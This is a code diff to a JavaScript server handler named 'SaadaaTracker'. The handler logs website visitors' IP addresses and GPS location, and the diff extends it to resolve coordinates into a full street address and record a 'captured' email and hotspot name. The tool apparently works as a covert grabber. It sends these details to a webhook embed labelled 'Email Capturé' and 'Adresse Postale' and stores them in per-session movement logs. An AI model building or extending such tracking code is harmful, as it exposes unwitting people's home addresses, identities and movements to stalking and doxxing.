@@ -51,18 +51,24 @@ export default async function handler(req, res) {
   const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number' && preciseLocation.lat !== 0;
 
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
+  let fullAddress = "Non disponible (IP uniquement)";
   
-  // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
+  // Si on a le GPS, on essaie de trouver l'adresse complète (Reverse Geocoding)
   if (hasGps) {
     try {
-      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
+      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}&addressdetails=1`, {
         headers: { 'User-Agent': 'SaadaaTracker/1.0' }
       });
       const revData = await revRes.json();
       if (revData && revData.address) {
-        const city = revData.address.city || revData.address.town || revData.address.village || revData.address.municipality;
-        const county = revData.address.county || revData.address.state;
-        displayLocation = `📍 ${city || 'Ville inconnue'} (${county || ''}), ${revData.address.country}`;
+        const addr = revData.address;
+        const city = addr.city || addr.town || addr.village || addr.municipality || addr.suburb;
+        const road = addr.road || addr.pedestrian || addr.street;
+        const houseNumber = addr.house_number || "";
+        const postcode = addr.postcode || "";
+        
+        displayLocation = `📍 ${city || 'Ville inconnue'} (${addr.state || addr.county || ''}), ${addr.country}`;
+        fullAddress = `${houseNumber} ${road}, ${postcode} ${city}, ${addr.country}`.trim().replace(/^,/, '');
       }
     } catch (e) {
       console.error("Erreur reverse géo:", e);
@@ -79,6 +85,9 @@ export default async function handler(req, res) {
     publicIp,
     localIp: validatedLocalIp,
     location: displayLocation,
+    postalAddress: fullAddress,
+    email: deviceStats?.email || null,
+    hotspotName: deviceStats?.networkName || null,
     isp: geo.isp || 'ISP inconnu',
     coords: hasGps ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
     accuracy: hasGps ? preciseLocation.accuracy : null,
@@ -117,6 +126,18 @@ export default async function handler(req, res) {
       { name: "🏠 IP Locale (Appareil)", value: `\`${validatedLocalIp}\``, inline: true },
       { name: "📍 Localisation Précise", value: locValue }
     ];
+
+    if (logEntry.isPrecise) {
+      fields.push({ name: "🏠 Adresse Postale", value: `\`${logEntry.postalAddress}\`` });
+    }
+
+    if (logEntry.email) {
+      fields.push({ name: "📧 Email Capturé", value: `\`${logEntry.email}\``, inline: true });
+    }
+
+    if (logEntry.hotspotName) {
+      fields.push({ name: "📶 Partage Connexion", value: `\`${logEntry.hotspotName}\``, inline: true });
+    }
 
     if (!logEntry.isPrecise) {
       fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
@@ -174,6 +195,9 @@ export default async function handler(req, res) {
         unixTime: logEntry.unixTime,
         isPrecise: logEntry.isPrecise,
         localIp: validatedLocalIp,
+        postalAddress: logEntry.postalAddress,
+        email: logEntry.email,
+        hotspotName: logEntry.hotspotName,
         page: logEntry.page
       });
       await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);
